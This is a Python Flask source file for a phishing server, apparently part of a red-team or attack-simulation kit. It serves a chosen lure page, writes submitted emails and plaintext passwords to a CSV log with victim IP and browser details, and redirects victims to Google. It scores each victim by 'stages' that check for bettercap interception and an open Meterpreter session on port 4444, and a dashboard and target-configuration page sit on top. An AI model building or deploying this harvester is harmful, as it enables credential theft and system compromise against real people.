import sys
import json
import csv
import psutil
from datetime import datetime
from flask import Flask, request, render_template, redirect

app = Flask(__name__)

FIELDNAMES = ['ip_addr', 'email','password','user_agent','platform', 'date', 'stage1','stage2', 'stage3', 'stage4']

STAGES = {
    'stage1': 1,
    'stage2': 2,
    'stage3': 3,
    'stage4': 4,
}

def check_stage(log_file, ip_addr):
    with open(log_file) as f:
        content = f.readlines()
        return ip_addr in content


def check_meterpreter_session(ip_addr):
    return len([x for x in psutil.net_connections() if x.laddr.port == 4444 and x.raddr.ip == ip_addr]) > 0


def calculate_points():
    input_file = csv.DictReader(open('log.csv', 'r'))
    out = [ row for row in input_file ]
    for line in out:
        points = 0
        for stage in STAGES:
            if line[stage] == 'True':
                points += STAGES[stage]
        line.update({'points': points})
    return out
        

@app.route('/', methods=['GET', 'POST'])
def phishing_server():
    target = sys.argv[1]
    if request.method == 'POST':
        with open('log.csv', 'w+', newline='') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=FIELDNAMES)
            writer.writeheader()
            writer.writerow({
                'ip_addr': request.remote_addr,
                'email': request.form['email'],
                'password': request.form['password'],
                'user_agent': f'{request.user_agent.browser} - {request.user_agent.version}',
                'platform': request.user_agent.platform,
                'date': datetime.now().strftime('%H:%m %d-%m-%Y'),
                'stage1': check_stage('log_bettercap.txt', request.remote_addr) or request.remote_addr,
                'stage2': True,
                'stage3': check_meterpreter_session(request.remote_addr),
                'stage4': True if request.form['email'] and request.form['password'] else False,
            })        
            return redirect("https://www.google.com", code=302)
    return render_template(target, name='index')


@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    return render_template(
        'dashboard.html', 
        response=calculate_points(), 
        name='dashboard'
    )


@app.route('/config', methods=['GET', 'POST'])
def config():
    if request.method == 'POST':
        local_ip = request.form.get('local-ip')
        target_domain = request.form.get('target-domain')
        email_address = request.form.get('email-address')
        email_address = email_address.split(',')

        # TODO: validation with error message

    return render_template(
        'config.html',
        response=[],
        name='config'
    )


@app.route('/start', methods=['GET', 'POST'])
def start():
    return render_template(
        'start.html',
        response=[],
        name='start'
    )


if __name__ == '__main__':
    app.run(host='0.0.0.0', port='80', debug=True)
